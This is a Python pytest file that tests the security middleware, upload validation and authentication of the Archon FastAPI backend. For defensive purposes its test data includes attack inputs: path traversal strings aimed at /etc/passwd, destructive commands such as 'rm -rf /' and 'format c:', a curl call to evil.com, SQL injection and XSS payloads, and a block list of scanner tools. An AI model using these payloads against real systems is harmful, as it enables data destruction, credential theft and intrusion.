"""
Security tests for the Archon backend.
Tests security middleware, rate limiting, input validation, and attack prevention.
"""
import pytest
import time
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
from fastapi import Request

from app.middleware.security import SecurityHeadersMiddleware, RequestLoggingMiddleware

class TestSecurityHeaders:
    """Test security headers middleware."""
    
    def test_security_headers_present(self, client: TestClient):
        """Test that security headers are present in responses."""
        response = client.get("/health")
        
        assert "X-Content-Type-Options" in response.headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        
        assert "X-Frame-Options" in response.headers
        assert response.headers["X-Frame-Options"] == "DENY"
        
        assert "X-XSS-Protection" in response.headers
        assert response.headers["X-XSS-Protection"] == "1; mode=block"
        
        assert "Content-Security-Policy" in response.headers
        assert "default-src 'self'" in response.headers["Content-Security-Policy"]
        
        assert "Referrer-Policy" in response.headers
        assert "Permissions-Policy" in response.headers
    
    def test_hsts_header_https(self):
        """Test HSTS header is added for HTTPS requests."""
        pass

class TestRateLimiting:
    """Test rate limiting functionality."""
    
    def test_rate_limiting_normal_requests(self, client: TestClient):
        """Test that normal request rates are allowed."""
        for i in range(10):
            response = client.get("/health")
            assert response.status_code != 429, f"Request {i} was rate limited"
    
    @pytest.mark.slow
    def test_rate_limiting_excessive_requests(self, client: TestClient):
        """Test that excessive requests are rate limited."""
        pass
    
    def test_rate_limiting_different_endpoints(self, client: TestClient):
        """Test that different endpoints have different rate limits."""
        pass

class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_directory_traversal_prevention(self, client: TestClient):
        """Test prevention of directory traversal attacks."""
        malicious_paths = [
            "/api/projects/../../../etc/passwd",
            "/api/projects/..%2f..%2fetc%2fpasswd",
            "/api/projects/..%5c..%5cwindows%5csystem32",
        ]
        
        for path in malicious_paths:
            response = client.get(path)
            assert response.status_code in [400, 404], f"Directory traversal not blocked: {path}"
    
    def test_malicious_user_agent_blocking(self, client: TestClient):
        """Test blocking of malicious user agents."""
        malicious_agents = [
            "sqlmap/1.0",
            "nikto/2.1.6",
            "nmap scripting engine",
            "masscan/1.0"
        ]
        
        for agent in malicious_agents:
            response = client.get("/health", headers={"User-Agent": agent})
            assert response.status_code == 400, f"Malicious user agent not blocked: {agent}"
    
    def test_suspicious_headers_blocking(self, client: TestClient):
        """Test blocking of suspicious headers."""
        suspicious_headers = [
            {"X-Forwarded-Host": "evil.com"},
            {"X-Original-URL": "/admin/secret"},
            {"X-Rewrite-URL": "/bypass/auth"},
        ]
        
        for headers in suspicious_headers:
            response = client.get("/health", headers=headers)
            assert response.status_code == 400, f"Suspicious headers not blocked: {headers}"
    
    def test_oversized_request_blocking(self, client: TestClient):
        """Test blocking of oversized requests."""
        large_data = "x" * (300 * 1024 * 1024)
        
        response = client.post(
            "/api/projects/upload",
            data={"large_field": large_data},
            headers={"Content-Length": str(len(large_data))}
        )
        
        assert response.status_code in [400, 413], "Oversized request not blocked"

class TestFileUploadSecurity:
    """Test file upload security measures."""
    
    def test_dangerous_file_extension_blocking(self, client: TestClient):
        """Test blocking of dangerous file extensions."""
        dangerous_files = [
            ("virus.exe", b"MZ\x90\x00"),
            ("malware.dll", b"MZ\x90\x00"),
            ("script.bat", b"@echo off\nformat c:"),
            ("trojan.scr", b"malicious content"),
            ("archive.zip", b"PK\x03\x04"),
        ]
        
        for filename, content in dangerous_files:
            files = {"files": (filename, content, "application/octet-stream")}
            response = client.post("/api/projects/upload", files=files)
            
            assert response.status_code == 400, f"Dangerous file not blocked: {filename}"
            assert "not allowed" in response.json().get("detail", "").lower()
    
    def test_malicious_content_detection(self, client: TestClient):
        """Test detection of malicious content in files."""
        malicious_contents = [
            ("evil.py", b"import os; os.system('rm -rf /')"),
            ("backdoor.py", b"subprocess.call(['curl', 'evil.com'], shell=True)"),
            ("exploit.py", b"eval(input('Enter code: '))"),
            ("dangerous.py", b"exec(open('/etc/passwd').read())"),
        ]
        
        for filename, content in malicious_contents:
            files = {"files": (filename, content, "text/plain")}
            response = client.post("/api/projects/upload", files=files)
            
            assert response.status_code == 400, f"Malicious content not detected: {filename}"
            assert "malicious" in response.json().get("detail", "").lower()
    
    def test_filename_sanitization(self, client: TestClient):
        """Test filename sanitization and validation."""
        malicious_filenames = [
            "../../../etc/passwd",
            "file\x00name.py",
            "con.py",
            "file<script>alert('xss')</script>.py",
            "x" * 300 + ".py",
        ]
        
        for filename in malicious_filenames:
            files = {"files": (filename, b"print('hello')", "text/plain")}
            response = client.post("/api/projects/upload", files=files)
            
            assert response.status_code == 400, f"Malicious filename not blocked: {filename}"
    
    def test_file_size_limits(self, client: TestClient):
        """Test file size limit enforcement."""
        large_content = b"x" * (60 * 1024 * 1024)
        
        files = {"files": ("large.py", large_content, "text/plain")}
        response = client.post("/api/projects/upload", files=files)
        
        assert response.status_code == 413, "Large file not blocked"
        assert "too large" in response.json().get("detail", "").lower()
    
    def test_total_upload_size_limit(self, client: TestClient):
        """Test total upload size limit enforcement."""
        files = []
        for i in range(10):
            content = b"x" * (30 * 1024 * 1024)
            files.append(("files", (f"file{i}.py", content, "text/plain")))
        
        response = client.post("/api/projects/upload", files=files)
        
        assert response.status_code == 413, "Total size limit not enforced"

class TestAuthenticationSecurity:
    """Test authentication and authorization security."""
    
    def test_unauthenticated_access_blocked(self, client: TestClient):
        """Test that unauthenticated access to protected endpoints is blocked."""
        protected_endpoints = [
            "/api/projects/projects",
            "/api/projects/upload",
            "/api/projects/github/repositories",
        ]
        
        for endpoint in protected_endpoints:
            response = client.get(endpoint)
            assert response.status_code in [401, 403], f"Unauthenticated access allowed to {endpoint}"
    
    def test_invalid_token_rejected(self, client: TestClient):
        """Test that invalid authentication tokens are rejected."""
        invalid_tokens = [
            "Bearer invalid_token",
            "Bearer expired_token",
            "Bearer malformed.token.here",
            "InvalidScheme token_here",
        ]
        
        for token in invalid_tokens:
            response = client.get(
                "/api/projects/projects",
                headers={"Authorization": token}
            )
            assert response.status_code in [401, 403], f"Invalid token accepted: {token}"

class TestSecurityLogging:
    """Test security event logging."""
    
    def test_security_events_logged(self, client: TestClient):
        """Test that security events are properly logged."""
        with patch('builtins.print') as mock_print:
            client.get("/health", headers={"User-Agent": "sqlmap/1.0"})
            
            logged_calls = [str(call) for call in mock_print.call_args_list]
            security_logs = [log for log in logged_calls if "SECURITY" in log]
            assert len(security_logs) > 0, "Security event not logged"
    
    def test_upload_attempts_logged(self, client: TestClient):
        """Test that file upload attempts are logged."""
        with patch('builtins.print') as mock_print:
            files = {"files": ("test.py", b"print('hello')", "text/plain")}
            client.post("/api/projects/upload", files=files)
            
            logged_calls = [str(call) for call in mock_print.call_args_list]
            upload_logs = [log for log in logged_calls if "UPLOAD" in log]
    
    def test_rate_limit_violations_logged(self, client: TestClient):
        """Test that rate limit violations are logged."""
        pass

class TestSecurityConfiguration:
    """Test security configuration and environment setup."""
    
    def test_production_security_settings(self):
        """Test that production security settings are properly configured."""
        with patch.dict('os.environ', {'APP_ENV': 'production'}):
            from security_config import SecurityConfig
            
            assert SecurityConfig.MAX_FILE_SIZE <= 50 * 1024 * 1024
            assert SecurityConfig.MAX_TOTAL_SIZE <= 200 * 1024 * 1024
            assert SecurityConfig.UPLOAD_RATE_LIMIT == "3/minute"
    
    def test_development_security_settings(self):
        """Test that development security settings are more permissive."""
        with patch.dict('os.environ', {'APP_ENV': 'development'}):
            from security_config import SecurityConfig
            
            assert SecurityConfig.MAX_FILE_SIZE >= 50 * 1024 * 1024
            assert SecurityConfig.MAX_TOTAL_SIZE >= 200 * 1024 * 1024

class TestSecurityMiddleware:
    """Test security middleware functionality."""
    
    def test_security_middleware_initialization(self):
        """Test that security middleware initializes correctly."""
        from fastapi import FastAPI
        
        app = FastAPI()
        middleware = SecurityHeadersMiddleware(app)
        
        assert middleware is not None
        assert hasattr(middleware, 'dispatch')
    
    def test_request_logging_middleware(self):
        """Test request logging middleware functionality."""
        from fastapi import FastAPI
        
        app = FastAPI()
        middleware = RequestLoggingMiddleware(app)
        
        assert middleware is not None
        assert hasattr(middleware, 'dispatch')
        assert hasattr(middleware, 'request_counts')

@pytest.mark.security
class TestPenetrationTestingScenarios:
    """Test common penetration testing scenarios."""
    
    def test_sql_injection_prevention(self, client: TestClient):
        """Test prevention of SQL injection attacks."""
        sql_payloads = [
            "'; DROP TABLE projects; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO projects VALUES ('evil'); --",
        ]
        
        for payload in sql_payloads:
            response = client.get(f"/api/projects/projects?search={payload}")
            assert response.status_code != 500, f"SQL injection may have succeeded: {payload}"
    
    def test_xss_prevention(self, client: TestClient):
        """Test prevention of XSS attacks."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
        ]
        
        for payload in xss_payloads:
            files = {"files": ("test.py", payload.encode(), "text/plain")}
            response = client.post("/api/projects/upload", files=files)
            
            if response.status_code == 200:
                assert payload not in response.text, f"XSS payload not escaped: {payload}"
    
    def test_csrf_protection(self, client: TestClient):
        """Test CSRF protection mechanisms."""
        response = client.post("/api/projects/projects", json={
            "repo_name": "test",
            "repo_owner": "test",
            "repo_url": "https://github.com/test/test"
        })
        
        assert response.status_code in [401, 403], "CSRF protection may be missing"

if __name__ == "__main__":
    pytest.main([__file__])
